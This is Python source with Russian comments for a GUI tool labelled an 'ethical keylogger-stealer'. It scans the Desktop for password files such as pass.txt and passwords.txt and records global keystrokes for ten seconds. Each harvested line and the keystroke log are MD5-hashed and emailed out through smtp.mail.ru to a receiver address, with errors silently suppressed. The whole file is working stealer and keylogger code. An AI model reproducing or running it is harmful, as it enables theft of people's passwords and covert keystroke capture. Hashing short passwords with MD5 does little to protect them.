import os
import smtplib
import hashlib
import time
import keyboard
from tkinter import Tk, Label, Entry, Button, messagebox, DISABLED, NORMAL

# Функция для отправки электронной почты
def send_email(subject, content, sender_email, password, receiver_email):
    message = f'Subject: {subject}\n\n{content}'

    try:
        server = smtplib.SMTP('smtp.mail.ru', 587)
        server.starttls()
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message)
        server.quit()
    except:
        pass

# Функция для хэширования строки по алгоритму MD5
def hash_string(string):
    hash_object = hashlib.md5(string.encode())
    return hash_object.hexdigest()

# Функция для обработки файлов на рабочем столе
def process_files(sender_email, password, receiver_email):
    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    files_to_search = ['pass.txt', 'password.txt', 'passwords.txt', 'пароли.txt']

    for file_name in files_to_search:
        file_path = os.path.join(desktop_path, file_name)
        if os.path.isfile(file_path):
            with open(file_path, 'r') as file:
                for line in file:
                    hashed_line = hash_string(line.strip())
                    email_subject = 'EHP'
                    email_content = f'EHP password {hashed_line}'
                    send_email(email_subject, email_content, sender_email, password, receiver_email)

    messagebox.showinfo('Успех', 'Поиск файлов с паролями завершен.')

# Функция для обработки нажатий клавиш
def process_key_presses(sender_email, password, receiver_email):
    key_combination = ''
    start_time = time.time()

    def on_press(event):
        nonlocal key_combination
        key_combination += event.name

    keyboard.on_press(on_press)

    while time.time() - start_time <= 10:
        if keyboard.is_pressed('esc'):
            break

    keyboard.unhook_all()

    hashed_combination = hash_string(key_combination.strip())
    email_subject = 'EHP'
    email_content = f'EHP keylog {hashed_combination}'
    send_email(email_subject, email_content, sender_email, password, receiver_email)

    return key_combination

# Функция для создания окна с вводом данных
def create_window():
    window = Tk()
    window.title('Этичный Кейлоггер-стилер')
    window.geometry('300x200')

    label_email = Label(window, text='Email:')
    label_email.pack()

    entry_email = Entry(window)
    entry_email.pack()

    label_password = Label(window, text='Пароль:')
    label_password.pack()

    entry_password = Entry(window, show='*')
    entry_password.pack()

    label_receiver_email = Label(window, text='Email получателя:')
    label_receiver_email.pack()

    entry_receiver_email = Entry(window)
    entry_receiver_email.pack()

    label_master_key = Label(window, text='Мастер-ключ:')
    label_master_key.pack()

    entry_master_key = Entry(window, show='*')
    entry_master_key.pack()

    def start_search():
        email = entry_email.get()
        password = entry_password.get()
        receiver_email = entry_receiver_email.get()
        master_key = entry_master_key.get()

        if master_key == 'EHP':
            process_files(email, password, receiver_email)

    def start_keylogger():
        email = entry_email.get()
        password = entry_password.get()
        receiver_email = entry_receiver_email.get()
        master_key = entry_master_key.get()

        if master_key == 'EHP':
            button_keylogger.config(state=DISABLED)
            messagebox.showinfo('Уведомление', 'Кейлоггер запущен. Считывание клавиш продолжится в течение 10 секунд.')

            key_combination = process_key_presses(email, password, receiver_email)

            messagebox.showinfo('Успех', f'Считанная комбинация клавиш: {key_combination}')
            button_keylogger.config(state=NORMAL)

    button_search = Button(window, text='Начать поиск файлов с паролями', command=start_search)
    button_search.pack()

    button_keylogger = Button(window, text='Запустить кейлоггер', command=start_keylogger)
    button_keylogger.pack()

    window.mainloop()

# Основная функция программы
def main():
    create_window()

# Начало выполнения программы
if __name__ == '__main__':
    main()